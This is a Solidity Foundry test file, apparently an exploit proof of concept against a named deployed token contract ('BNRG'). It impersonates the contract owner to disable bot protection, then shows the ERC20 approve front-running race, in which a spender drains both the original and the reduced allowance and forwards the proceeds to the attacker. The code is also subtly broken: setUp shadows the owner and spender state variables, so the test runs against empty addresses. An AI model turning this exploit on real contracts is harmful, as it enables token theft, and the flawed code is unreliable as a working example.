pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBNRG {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function mint(uint256 numTokens) external returns(bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    address internal owner;
    address internal spender;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create test addresses
        address owner = address(0x123);
        address spender = address(0x456);

        // Label for clarity
        vm.label(owner, "Token Owner");
        vm.label(spender, "Attacker Spender");
        vm.label(TARGET, "BNRG Token");

        // Impersonate contract owner to change state
        address contractOwner = IBNRG(TARGET).owner();
        vm.startPrank(contractOwner);
        IBNRG(TARGET).setBotProtection(false); // Set to Unlocked state
        vm.stopPrank();

        // Get some BNRG tokens to owner address
        // Since all tokens are initially with contract owner, transfer some to our owner address
        vm.prank(contractOwner);
        IBNRG(TARGET).transfer(owner, 1000 * 10**18);

        // Verify owner has tokens
        uint256 ownerBalance = IBNRG(TARGET).balanceOf(owner);
        require(ownerBalance >= 1000 * 10**18, "Owner should have tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Verify owner has sufficient balance first
        uint256 ownerInitialBalance = IBNRG(TARGET).balanceOf(owner);
        require(ownerInitialBalance > 0, "Owner must have tokens");

        // Step 1: Owner approves spender for amount X
        uint256 X = 10 * 10**18; // Very small amount
        uint256 Y = 5 * 10**18;  // Very small reduced amount

        vm.prank(owner);
        IBNRG(TARGET).approve(spender, X);

        // Verify approval
        uint256 allowance1 = IBNRG(TARGET).allowance(owner, spender);
        require(allowance1 == X, "Initial allowance should be X");

        // Step 2: Spender front-runs the reduction approval
        // Check balance before
        uint256 spenderBalanceBefore = IBNRG(TARGET).balanceOf(spender);

        vm.prank(spender);
        bool success = IBNRG(TARGET).transferFrom(owner, spender, X);
        require(success, "First transferFrom should succeed");

        // Check balance after
        uint256 spenderBalanceAfter = IBNRG(TARGET).balanceOf(spender);
        require(spenderBalanceAfter == spenderBalanceBefore + X, "Spender should receive X tokens");

        // Step 3: Owner reduces approval to Y
        vm.prank(owner);
        IBNRG(TARGET).approve(spender, Y);

        // Verify new allowance
        uint256 allowance2 = IBNRG(TARGET).allowance(owner, spender);
        require(allowance2 == Y, "Reduced allowance should be Y");

        // Step 4: Spender uses the new allowance Y
        vm.prank(spender);
        success = IBNRG(TARGET).transferFrom(owner, spender, Y);
        require(success, "Second transferFrom should succeed");

        // Verify spender balance increased by X + Y
        uint256 spenderFinalBalance = IBNRG(TARGET).balanceOf(spender);
        require(spenderFinalBalance == spenderBalanceBefore + X + Y, "Spender should have X + Y tokens total");

        // Transfer profits to attacker for oracle check
        vm.prank(spender);
        IBNRG(TARGET).transfer(attacker, spenderFinalBalance);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

